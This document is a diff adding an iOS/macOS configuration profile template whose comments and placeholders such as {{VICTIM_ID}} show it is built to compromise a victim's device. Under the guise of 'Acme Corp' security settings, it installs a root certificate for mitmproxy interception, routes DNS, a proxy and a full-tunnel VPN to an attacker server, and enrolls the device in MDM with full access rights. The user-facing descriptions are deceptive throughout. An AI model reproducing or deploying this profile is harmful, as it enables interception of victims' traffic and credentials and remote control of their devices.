@@ -1,0 +1,250 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+
+        <!-- ============ 1. ROOT CA (trust anchor for mitmproxy) ============ -->
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.acme.security.ca.{{VICTIM_ID}}</string>
+            <key>PayloadUUID</key>
+            <string>{{UUID_CA}}</string>
+            <key>PayloadDisplayName</key>
+            <string>Acme Security Root</string>
+            <key>PayloadDescription</key>
+            <string>Trusted root certificate for secure network access.</string>
+            <key>PayloadOrganization</key>
+            <string>Acme Corp</string>
+            <key>PayloadCertificateFileName</key>
+            <string>acme-root.cer</string>
+            <key>PayloadContent</key>
+            <data>{{CA_DER_B64}}</data>
+        </dict>
+
+        <!-- ============ 2. DNS over HTTPS (recon + ECH stripping) ============ -->
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.dnsSettings.managed</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.acme.security.dns.{{VICTIM_ID}}</string>
+            <key>PayloadUUID</key>
+            <string>{{UUID_DNS}}</string>
+            <key>PayloadDisplayName</key>
+            <string>Secure DNS</string>
+            <key>PayloadDescription</key>
+            <string>Encrypted DNS for privacy and content filtering.</string>
+            <key>PayloadOrganization</key>
+            <string>Acme Corp</string>
+            <key>DNSSettings</key>
+            <dict>
+                <key>DNSProtocol</key>
+                <string>HTTPS</string>
+                <key>ServerURL</key>
+                <string>https://{{DOH_HOST}}/dns-query</string>
+                <key>ServerAddresses</key>
+                <array>
+                    <string>{{VPS_IP}}</string>
+                </array>
+            </dict>
+        </dict>
+
+        <!-- ============ 3. GLOBAL HTTP PROXY (fallback path) ============ -->
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.proxy.http.global</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.acme.security.proxy.{{VICTIM_ID}}</string>
+            <key>PayloadUUID</key>
+            <string>{{UUID_PROXY}}</string>
+            <key>PayloadDisplayName</key>
+            <string>Web Proxy</string>
+            <key>PayloadDescription</key>
+            <string>Content filtering proxy configuration.</string>
+            <key>PayloadOrganization</key>
+            <string>Acme Corp</string>
+            <key>ProxyType</key>
+            <string>Manual</string>
+            <key>ProxyServer</key>
+            <string>{{PROXY_HOST}}</string>
+            <key>ProxyServerPort</key>
+            <integer>{{PROXY_PORT}}</integer>
+            <key>ProxyUsername</key>
+            <string>{{PROXY_USER}}</string>
+            <key>ProxyPassword</key>
+            <string>{{PROXY_PASS}}</string>
+            <!-- let captive-portal logins bypass the proxy, otherwise Wi-Fi joins break -->
+            <key>ProxyCaptiveLoginAllowed</key>
+            <true/>
+        </dict>
+
+        <!-- ============ 4. VPN — IKEv2 FULL TUNNEL (primary path) ============ -->
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.vpn.managed</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.acme.security.vpn.{{VICTIM_ID}}</string>
+            <key>PayloadUUID</key>
+            <string>{{UUID_VPN}}</string>
+            <key>PayloadDisplayName</key>
+            <string>Secure Tunnel</string>
+            <key>PayloadDescription</key>
+            <string>Encrypted corporate tunnel.</string>
+            <key>PayloadOrganization</key>
+            <string>Acme Corp</string>
+            <key>UserDefinedName</key>
+            <string>Secure Tunnel</string>
+            <key>VPNType</key>
+            <string>IKEv2</string>
+            <key>VPNSubType</key>
+            <string></string>
+            <key>VPN</key>
+            <dict>
+                <key>RemoteAddress</key>
+                <string>{{VPS_IP}}</string>
+                <key>LocalIdentifier</key>
+                <string>{{VICTIM_ID}}</string>
+                <key>RemoteIdentifier</key>
+                <string>{{VPS_IP}}</string>
+                <key>AuthenticationMethod</key>
+                <string>None</string>
+                <key>ExtendedAuthEnabled</key>
+                <integer>1</integer>
+                <key>AuthName</key>
+                <string>{{VICTIM_ID}}</string>
+                <key>AuthPassword</key>
+                <string>{{VPN_PASS}}</string>
+                <key>DisableMOBIKE</key>
+                <integer>0</integer>
+                <key>UseIPv4</key>
+                <true/>
+                <key>UseIPv6</key>
+                <false/>
+                <key>EnablePFS</key>
+                <integer>0</integer>
+                <key>EnableCertificateRevocationCheck</key>
+                <integer>0</integer>
+                <key>DeadPeerDetectionRate</key>
+                <string>Medium</string>
+                <key>IPv4</key>
+                <dict>
+                    <!-- OverridePrimary = full tunnel: all traffic to us -->
+                    <key>OverridePrimary</key>
+                    <integer>1</integer>
+                    <key>ConfigMethod</key>
+                    <string>DHCP</string>
+                </dict>
+            </dict>
+        </dict>
+
+        <!-- ============ 5. SCEP (device identity for MDM enrollment) ============ -->
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.security.scep</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.acme.security.scep.{{VICTIM_ID}}</string>
+            <key>PayloadUUID</key>
+            <string>{{UUID_SCEP}}</string>
+            <key>PayloadDisplayName</key>
+            <string>Device Identity</string>
+            <key>PayloadOrganization</key>
+            <string>Acme Corp</string>
+            <key>PayloadContent</key>
+            <dict>
+                <key>URL</key>
+                <string>https://{{MDM_HOST}}/scep</string>
+                <key>Name</key>
+                <string>Acme Device Identity</string>
+                <key>Subject</key>
+                <string>/CN={{VICTIM_ID}}/O=Acme Corp/C=US</string>
+                <key>Challenge</key>
+                <string>{{SCEP_CHALLENGE}}</string>
+                <key>Keysize</key>
+                <integer>2048</integer>
+                <key>Key Type</key>
+                <string>RSA</string>
+                <key>Key Usage</key>
+                <integer>5</integer>
+            </dict>
+        </dict>
+
+        <!-- ============ 6. MDM ENROLLMENT (last — references SCEP UUID) ============ -->
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.mdm</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.acme.security.mdm.{{VICTIM_ID}}</string>
+            <key>PayloadUUID</key>
+            <string>{{UUID_MDM}}</string>
+            <key>PayloadDisplayName</key>
+            <string>Device Management</string>
+            <key>PayloadOrganization</key>
+            <string>Acme Corp</string>
+            <key>IdentityCertificateUUID</key>
+            <string>{{UUID_SCEP}}</string>
+            <key>Topic</key>
+            <string>{{APNS_TOPIC}}</string>
+            <key>ServerURL</key>
+            <string>https://{{MDM_HOST}}/mdm</string>
+            <key>CheckInURL</key>
+            <string>https://{{MDM_HOST}}/checkin</string>
+            <key>ServerCapabilities</key>
+            <array>
+                <integer>1</integer>
+                <integer>3</integer>
+                <integer>5</integer>
+                <integer>7</integer>
+                <integer>9</integer>
+                <integer>13</integer>
+            </array>
+            <key>SignMessage</key>
+            <true/>
+            <key>CheckOutWhenRemoved</key>
+            <true/>
+            <key>AccessRights</key>
+            <integer>8191</integer>
+        </dict>
+
+    </array>
+
+    <!-- ================= TOP-LEVEL ================= -->
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadIdentifier</key>
+    <string>com.acme.security.profile.{{VICTIM_ID}}</string>
+    <key>PayloadUUID</key>
+    <string>{{UUID_ROOT}}</string>
+    <key>PayloadDisplayName</key>
+    <string>Acme Security Settings</string>
+    <key>PayloadDescription</key>
+    <string>Required network and security configuration for Acme services.</string>
+    <key>PayloadOrganization</key>
+    <string>Acme Corp</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadScope</key>
+    <string>System</string>
+    <key>ConsentText</key>
+    <dict>
+        <key>default</key>
+        <string>By installing, you agree to Acme's network security policy.</string>
+    </dict>
+</dict>
+</plist>
